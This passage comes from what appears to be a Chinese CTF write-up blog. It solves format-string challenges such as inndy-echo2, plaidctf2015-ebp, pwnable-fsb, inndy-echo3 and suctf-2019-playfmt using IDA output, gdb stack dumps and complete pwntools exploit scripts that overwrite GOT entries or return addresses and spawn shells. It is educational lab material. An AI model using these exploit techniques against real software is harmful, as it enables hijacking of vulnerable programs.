stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。</p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn echo(){  char s; // [rsp+0h] [rbp-110h]  unsigned __int64 v1; // [rsp+108h] [rbp-8h]  v1 = __readfsqword(0x28u);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s, 256LL);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。</p><h3 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre><p>找到关键点，然后看一下栈情况：</p><pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087--More--(25/48)0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad20870216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre><p>发现在<code>0x7fffffffe1e0</code>这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的<br>plt和got地址。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./echo2&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,28200)def leak1():    io.sendline(&#39;%34$p&#39;)    io.recvuntil(&#39;0x&#39;)    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)    return p_bass_addrp_bass_addr = leak1()print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint(&#39;print_got -&gt;&#39; + hex(print_got))system_plt = 0x790 + p_bass_addrprint(&#39;system_plt -&gt;&#39; + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])# raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>-—  </p><p>** 接下来的题，都是buf不再栈的上的题目。**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>可以看到nx保护是关闭的，可以想办法利用shellcode。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  while ( 1 )  {    result = (int)fgets(buf, 1024, stdin);    if ( !result )      break;    echo();  }  return result;}</code></pre><p>漏洞函数：</p><pre><code class="c">int make_response(){  return snprintf(response, 0x400u, buf);}</code></pre><p>代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。</p><h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code class="html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ：</p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p><strong>也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用<code>%xc%4$hhn</code> 就可以修改0xffffd378（ebp3）。</strong><br><strong>将0xffffd378 改为指向ret address的栈地址  <code>0xffffd33c</code>  ：</strong></p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>改完也就是这样的效果。<br><strong>这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），</strong><br><strong>接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用<code>%xc%y$hhn</code> 就可以修改0x804852c（ret address）</strong></p><p>这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="保护和arch-5"><a href="#保护和arch-5" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./playfmt&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,26382)buf = 0x0804A060 + 0x40 #0x804a0a0offset1 = 6offset2 = 10info(&#39;---leak stack address---&#39;)io.recvuntil(&#39;\n=====================\n&#39;)io.sendline(&#39;%10$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))info(&#39;---change the retaddr---&#39;)key = int(str(hex(ret_stack_addr))[-2:],16)payload = &quot;%{}c%6$hhn&quot;.format(key)raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.recv()key2 = 0xa0a0payload = &quot;%{}c%10$hn&quot;.format(key2)payload = payload.ljust(0x40)payload += asm(shellcraft.sh())raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()sleep(0.1)io.sendline(&#39;quit&#39;)io.interactive()</code></pre><p>记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="arch和保护"><a href="#arch和保护" class="headerlink" title="arch和保护"></a>arch和保护</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开了nx了。</p><h3 id="ida分析-7"><a href="#ida分析-7" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )  {    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);    read(0, buf, 0x64u);    printf(buf);  }  puts(&quot;Wait a sec...&quot;);  sleep(3u);</code></pre><p>可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。</p><pre><code class="c">  execve(path, &amp;path, 0);</code></pre><p>且这一条可以给你拿到shell。</p><p>那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。<br>因为这里下面就调用一次sleep，就改它好了，基本不会出问题。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。</p><h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>此时的EBP = 0xffffd228 </p><pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)0020| 0xffffd1f4 --&gt; 0x00024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x00028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)0040| 0xffffd208 --&gt; 0x00044| 0xffffd20c --&gt; 0x00048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x00052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x00060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x00064| 0xffffd220 --&gt; 0x00068| 0xffffd224 --&gt; 0x10072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p>可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。</strong>然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./fsb&#39;)# s = ssh(#     host=&quot;pwnable.kr&quot;,#     port=2222,#     user=&quot;fsb&quot;,#     password=&quot;guest&quot;# )# io = s.run(&quot;/home/fsb/fsb&quot;)# io = shell.run(&quot;/home/fsb/fsb&quot;)sleep_got = 0x0804a008info(&#39;--------leak stack base:-------&#39;)io.recvuntil(&#39;strings(1)\n&#39;)io.sendline(&#39;%14$p&#39;)io.recvuntil(&#39;0x&#39;)stack_base = int(io.recv(8),16) - 80print(hex(stack_base))info(&#39;--------leak the point to main ebp:-------&#39;)io.recvuntil(&#39;strings(2)\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)point = int(io.recv(8),16)print(hex(point))info(&#39;--------write sleep_got to main_ebp :-------&#39;)io.recvuntil(&#39;strings(3)\n&#39;)key1 = 0x0804A008payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;io.sendline(payload)info(&#39;--------write tag to sleep_got :-------&#39;)tag = 0x869Foffset = (point - stack_base) / 4payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)io.recvuntil(&#39;strings(4)\n&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="保护和arch-6"><a href="#保护和arch-6" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-8"><a href="#ida分析-8" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>这一处会让栈的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。<br>（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。）</p><h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>仔细看下此时的栈情况 ，然后再次分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址</li></ul><p>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。<br>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以写system的内存地址上got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>这样再传过去一下<code>/bin/sh</code>即可。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continue# io = def fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。<h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3></li></ul><p>这个题教会我一定要<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="保护和arch-7"><a href="#保护和arch-7" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>CANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partial</code></pre><h3 id="ida分析-9"><a href="#ida分析-9" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s){  char *v1; // eax  char *result; // eax  puts(&quot;...&quot;);  v1 = strtok(s, &quot;|&quot;);  printf(v1);  while ( 1 )  {    result = strtok(0, &quot;|&quot;);    if ( !result )      break;    printf(result);  }  return result;}</code></pre><p>这里因为用strtok做处理，只有一次的传送机会，payload需要用<code>|</code>    分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。<br>并且存在后门函数：</p><pre><code>.text:080485AB                 push    ebp.text:080485AC                 mov     ebp, esp.text:080485AE                 sub     esp, 8.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);.text:080485B1                 sub     esp, 0Ch.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;.text:080485B9                 call    _system.text:080485BE                 add     esp, 10h.text:080485C1                 nop.text:080485C2                 leave.text:080485C3                 retn</code></pre><p>这下可以直接改ret address即可。</p><h3 id="gdb分析-3"><a href="#gdb分析-3" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>先观察一下ebp链是否存在 ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>是存在的，然后直接利用就好了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>然后接着利用漏洞，改一下返回地址到后门函数即可。</p><p>（这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。）</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;system_addr = 0x080485B4tag1 = 0x4ctag2 = 0x85abio = process(&#39;./xman_2019_format&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27012)payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)while True:    try:        io.recvuntil(&#39;...\n...\n&#39;)        io.sendline(payload)        sleep(0.1)        io.recvuntil(&#39;~&#39;)        io.sendline(&#39;ls&#39;)        io.recvline()        io.recvline()        io.interactive()        break    except EOFError :        io.close()        io = process(&#39;./xman_2019_format&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre><p>需要爆破栈。</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="保护和arch-8"><a href="#保护和arch-8" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开启了RELRO，这样就无法got hijack了</p><h3 id="ida分析-10"><a href="#ida分析-10" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdb分析-4"><a href="#gdb分析-4" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>其会被读到堆上。紧接着跟到格式化字符串漏洞处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>看一下这个堆地址是否被程序操作修改了：</p><pre><code>gdb-peda$ x/s 0x8050b700x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。<br>第一步：<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理：</p><pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>此时再修改ebp1上的值，改成刚刚的堆地址 ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>这样exp写的时候，找好偏移%s一下就出来了。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = remote(&#39;node3.buuoj.cn&#39;,27816)io = process(&#39;./1&#39;)io.recvuntil(&#39;Magic echo Server&#39;)io.recvuntil(&#39;=====================\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)flag = int(io.recv(8),16)print(hex(flag))key = int((hex(flag))[-4:],16) - 32 -12 -4print(&#39;key&#39;+ hex(key))# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%6$p&#39;)io.recvuntil(&#39;0x&#39;)stack_point = int(io.recv(8),16) + 16tag1 = 